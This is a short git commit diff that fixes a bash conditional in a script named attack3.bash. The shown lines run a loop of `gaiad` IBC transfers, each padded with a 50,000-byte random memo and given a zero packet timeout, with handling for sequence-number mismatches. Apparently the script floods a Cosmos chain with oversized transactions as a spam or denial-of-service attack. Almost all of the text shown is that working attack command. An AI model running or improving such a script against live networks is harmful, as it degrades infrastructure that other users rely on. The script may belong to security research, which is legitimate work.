9d67d8ddd54eb2c60cd7379b94dd06756e5ca391
Jacob Gadikian <jacobgadikian@gmail.com>
2023-10-06 01:38:50 +0300

    fix conditional

--- attack3.bash
+++ attack3.bash
@@ -9,7 +9,7 @@ do
 	gaiad tx ibc-transfer transfer transfer channel-58 cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 1uatom --from test3 --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &2> attack3.log
 
 	# get sequence number if we've had an account sequence mismatch
-	if [ grep -q expected attack3.log ] 
+	if grep -q expected attack3.log ;
 
 	then
 		echo "sequence mismatch at $i, getting new sequence number"
